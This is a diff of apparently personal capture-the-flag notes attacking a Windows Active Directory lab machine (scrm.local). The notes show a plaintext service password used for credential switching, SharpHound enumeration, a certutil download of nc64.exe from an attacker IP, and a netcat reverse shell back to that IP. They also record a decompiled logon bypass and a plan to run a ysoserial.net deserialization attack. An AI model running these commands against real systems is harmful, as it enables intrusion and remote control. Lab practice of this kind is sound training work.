@@ -528,7 +528,7 @@ C:\Windows\system32>whoami
 whoami
 scrm\sqlsvc
 
-
+for this step, check bllodhound, this user has privi to perform this aciton, otherwise I cannot switch user
 PS C:\Users> $SecPassword = ConvertTo-SecureString 'ScrambledEggs9900' -AsPlainText -Force
 $SecPassword = ConvertTo-SecureString 'ScrambledEggs9900' -AsPlainText -Force
 PS C:\Users> $Cred = New-Object System.Management.Automation.PSCredential('scrm.local\MiscSvc', $SecPassword)
@@ -551,3 +551,121 @@ Microsoft Windows [Version 10.0.17763.2989]
 C:\Users\miscsvc\Documents>whoami
 whoami
 scrm\miscsvc
+
+
+PS C:\Users\miscsvc\Documents> . .\SharpHound.ps1
+. .\SharpHound.ps1
+
+PS C:\Users\miscsvc\Documents> invoke-BloodHound -CollectionMethod All -zipFileName m.zip
+invoke-BloodHound -CollectionMethod All -zipFileName m.zip
+2026-01-27T03:19:49.6333630+00:00|INFORMATION|This version of SharpHound is compatible with the 5.0.0 Release of BloodHound
+2026-01-27T03:19:49.6333630+00:00|INFORMATION|SharpHound Version: 2.9.0.0
+2026-01-27T03:19:49.6333630+00:00|INFORMATION|SharpHound Common Version: 4.5.2.0
+2026-01-27T03:19:49.6489949+00:00|INFORMATION|Resolved Collection Methods: Group, LocalAdmin, GPOLocalGroup, Session, LoggedOn, Trusts, ACL, Container, RDP, ObjectProps, DCOM, SPNTargets, PSRemote, UserRights, CARegistry, DCRegistry, CertServices, LdapServices, WebClientService, SmbInfo, NTLMRegistry
+2026-01-27T03:19:49.6646249+00:00|INFORMATION|[CommonLib LDAPUtils]New LDAP Config Set:
+ Server: 
+LdapPort: 389
+LdapSSLPort: 636
+ForceSSL: False
+AuthType: Negotiate
+MaxConcurrentQueries: 15
+
+ 1 name to SID mappings.
+ 1 machine sid mappings.
+ 4 sid to domain mappings.
+ 0 global catalog mappings.
+2026-01-27T03:19:58.1646108+00:00|INFORMATION|SharpHound Enumeration Completed at 03:19 on 27/01/2026! Happy Graphing!
+PS C:\Users\miscsvc\Documents> dir
+dir
+
+
+    Directory: C:\Users\miscsvc\Documents
+
+
+Mode                LastWriteTime         Length Name                                                                  
+----                -------------         ------ ----                                                                  
+-a----       27/01/2026     03:19          40507 20260127031951_m.zip                                                  
+-a----       27/01/2026     03:19           1625 MGJkNjRlOGMtMGI0OS00NzgzLThjYTYtMTI4OTJiZWQzYmMx.bin                  
+-a----       27/01/2026     03:06        1618189 SharpHound.ps1 
+
+
+Invoke-Command -Computer 127.0.0.1 -Credential $Cred -ScriptBlock { certutil.exe -urlcache -f http://10.10.16.194:/nc64.exe C:\Users\miscsvc\nc64.exe}
+
+Invoke-Command -Computer 127.0.0.1 -Credential $Cred -ScriptBlock { C:\Users\miscsvc\nc64.exe 10.10.16.194 8822 -e cmd.exe}
+
+Everyone                                    Well-known group S-1-1-0                                        Mandatory group, Enabled by default, Enabled group
+BUILTIN\Users                               Alias            S-1-5-32-545                                   Mandatory group, Enabled by default, Enabled group
+BUILTIN\Pre-Windows 2000 Compatible Access  Alias            S-1-5-32-554                                   Mandatory group, Enabled by default, Enabled group
+BUILTIN\Certificate Service DCOM Access     Alias            S-1-5-32-574                                   Mandatory group, Enabled by default, Enabled group
+BUILTIN\Remote Management Users             Alias            S-1-5-32-580                                   Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\NETWORK                        Well-known group S-1-5-2                                        Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\Authenticated Users            Well-known group S-1-5-11                                       Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\This Organization              Well-known group S-1-5-15                                       Mandatory group, Enabled by default, Enabled group
+SCRM\ITShare                                Group            S-1-5-21-2743207045-1827831105-2542523200-1609 Mandatory group, Enabled by default, Enabled group
+SCRM\ITUsers                                Group            S-1-5-21-2743207045-1827831105-2542523200-1610 Mandatory group, Enabled by default, Enabled group
+Authentication authority asserted identity  Well-known group S-1-18-1                                       Mandatory group, Enabled by default, Enabled group
+Mandatory Label\Medium Plus Mandatory Level Label            S-1-16-8448 
+
+C:\Shares\IT\Apps\Sales Order Client>dir
+dir
+ Volume in drive C has no label.
+ Volume Serial Number is 5805-B4B6
+
+ Directory of C:\Shares\IT\Apps\Sales Order Client
+
+05/11/2021  20:57    <DIR>          .
+05/11/2021  20:57    <DIR>          ..
+05/11/2021  20:52            86,528 ScrambleClient.exe
+05/11/2021  20:52            19,456 ScrambleLib.dll
+               2 File(s)        105,984 bytes
+               2 Dir(s)  15,217,414,144 bytes free
+
+
+
+
+
+
+
+
+
+// ScrambleLib.ScrambleNetClient
+// Token: 0x0600002B RID: 43 RVA: 0x000023D4 File Offset: 0x000005D4
+public bool Logon(string Username, string Password)
+{
+	bool result;
+	try
+	{
+		if (string.Compare(Username, "scrmdev", true) == 0)
+		{
+			Log.Write("Developer logon bypass used");
+			result = true;
+		}
+
+
+
+27/1/2026 4:34:23 pm	Uploading new order with reference 5
+27/1/2026 4:34:23 pm	Binary formatter init successful
+27/1/2026 4:34:23 pm	Order serialized to base64: AAEAAAD/////AQAAAAAAAAAMAgAAAEJTY3JhbWJsZUxpYiwgVmVyc2lvbj0xLjAuMy4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPW51bGwFAQAAABZTY3JhbWJsZUxpYi5TYWxlc09yZGVyBwAAAAtfSXNDb21wbGV0ZRBfUmVmZXJlbmNlTnVtYmVyD19RdW90ZVJlZmVyZW5jZQlfU2FsZXNSZXALX09yZGVySXRlbXMIX0R1ZURhdGUKX1RvdGFsQ29zdAABAQEDAAABf1N5c3RlbS5Db2xsZWN0aW9ucy5HZW5lcmljLkxpc3RgMVtbU3lzdGVtLlN0cmluZywgbXNjb3JsaWIsIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5XV0NBgIAAAAABgMAAAABNQYEAAAAAjU0BgUAAAAJUyBKZW5raW5zCQYAAAAAwPKCkl/eCAAAAAAAABRABAYAAAB/U3lzdGVtLkNvbGxlY3Rpb25zLkdlbmVyaWMuTGlzdGAxW1tTeXN0ZW0uU3RyaW5nLCBtc2NvcmxpYiwgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODldXQMAAAAGX2l0ZW1zBV9zaXplCF92ZXJzaW9uBgAACAgJBwAAAAAAAAAAAAAAEQcAAAAAAAAACw==
+27/1/2026 4:34:23 pm	Connecting to server
+27/1/2026 4:34:23 pm	Received from server: SCRAMBLECORP_ORDERS_V1.0.3;
+27/1/2026 4:34:23 pm	Parsing server response
+27/1/2026 4:34:23 pm	Response type = Banner
+27/1/2026 4:34:23 pm	Sending data to server: UPLOAD_ORDER;AAEAAAD/////AQAAAAAAAAAMAgAAAEJTY3JhbWJsZUxpYiwgVmVyc2lvbj0xLjAuMy4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPW51bGwFAQAAABZTY3JhbWJsZUxpYi5TYWxlc09yZGVyBwAAAAtfSXNDb21wbGV0ZRBfUmVmZXJlbmNlTnVtYmVyD19RdW90ZVJlZmVyZW5jZQlfU2FsZXNSZXALX09yZGVySXRlbXMIX0R1ZURhdGUKX1RvdGFsQ29zdAABAQEDAAABf1N5c3RlbS5Db2xsZWN0aW9ucy5HZW5lcmljLkxpc3RgMVtbU3lzdGVtLlN0cmluZywgbXNjb3JsaWIsIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5XV0NBgIAAAAABgMAAAABNQYEAAAAAjU0BgUAAAAJUyBKZW5raW5zCQYAAAAAwPKCkl/eCAAAAAAAABRABAYAAAB/U3lzdGVtLkNvbGxlY3Rpb25zLkdlbmVyaWMuTGlzdGAxW1tTeXN0ZW0uU3RyaW5nLCBtc2NvcmxpYiwgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODldXQMAAAAGX2l0ZW1zBV9zaXplCF92ZXJzaW9uBgAACAgJBwAAAAAAAAAAAAAAEQcAAAAAAAAACw==
+27/1/2026 4:34:23 pm	Getting response from server
+27/1/2026 4:34:24 pm	Received from server: SUCCESS;
+27/1/2026 4:34:24 pm	Parsing server response
+27/1/2026 4:34:24 pm	Response type = Success
+27/1/2026 4:34:24 pm	Upload successful
+
+
+└─$ nc 10.129.5.168 4411 
+SCRAMBLECORP_ORDERS_V1.0.3;
+UPLOAD_ORDER;AAEAAAD/////AQAAAAAAAAAMAgAAAEJTY3JhbWJsZUxpYiwgVmVyc2lvbj0xLjAuMy4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPW51bGwFAQAAABZTY3JhbWJsZUxpYi5TYWxlc09yZGVyBwAAAAtfSXNDb21wbGV0ZRBfUmVmZXJlbmNlTnVtYmVyD19RdW90ZVJlZmVyZW5jZQlfU2FsZXNSZXALX09yZGVySXRlbXMIX0R1ZURhdGUKX1RvdGFsQ29zdAABAQEDAAABf1N5c3RlbS5Db2xsZWN0aW9ucy5HZW5lcmljLkxpc3RgMVtbU3lzdGVtLlN0cmluZywgbXNjb3JsaWIsIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5XV0NBgIAAAAABgMAAAABNQYEAAAAAjU0BgUAAAAJUyBKZW5raW5zCQYAAAAAwPKCkl/eCAAAAAAAABRABAYAAAB/U3lzdGVtLkNvbGxlY3Rpb25zLkdlbmVyaWMuTGlzdGAxW1tTeXN0ZW0uU3RyaW5nLCBtc2NvcmxpYiwgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODldXQMAAAAGX2l0ZW1zBV9zaXplCF92ZXJzaW9uBgAACAgJBwAAAAAAAAAAAAAAEQcAAAAAAAAACw==
+SUCCESS;
+SESSION_TIMED_OUT;
+
+
+Deserialization Attack
+use https://github.com/pwntester/ysoserial.net to generate the payload to set in "UPLOAD_ORDER;"
+
+this tool is installed on WIn, I met some errors when installing.
